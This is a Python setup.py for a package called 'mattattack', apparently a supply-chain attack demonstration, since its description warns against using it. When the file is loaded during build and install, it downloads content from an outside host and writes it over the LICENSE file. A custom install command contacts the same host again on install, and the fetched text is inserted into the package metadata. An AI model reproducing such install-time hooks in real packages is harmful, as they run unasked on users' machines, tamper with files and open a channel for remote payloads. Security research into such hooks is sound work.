import setuptools
import requests
from setuptools.command.install import install

with open("README", "r", encoding = "utf-8") as fh:
    long_description = fh.read()

with open("LICENSE", "w+", encoding = "utf-8") as fl:
    r = requests.get('http://vulnerable.itappsec.com/GKHappy.png')
    fl.write(r.text)
    fl.close()

def RunCommand():
    r = requests.get('http://vulnerable.itappsec.com/GKHappy.png')

class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setuptools.setup(
    name = "mattattack",
    version = "0.0.4",
    author = "itappsec",
    author_email = "matt@itappsec.com",
    description = "Please, for the love of God, don't use this package" + r.text,
    long_description = long_description,
    long_description_content_type = "text/markdown",
    url = "http://itappsec.com",
    project_urls = {
        "Bug Tracker": "http://itappsec.com",
    },
    classifiers = [
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir = {"": "src"},
    packages = setuptools.find_packages(where="src"),
    python_requires = ">=3.6",
    cmdclass={
        'install' : RunInstallCommand
    },
)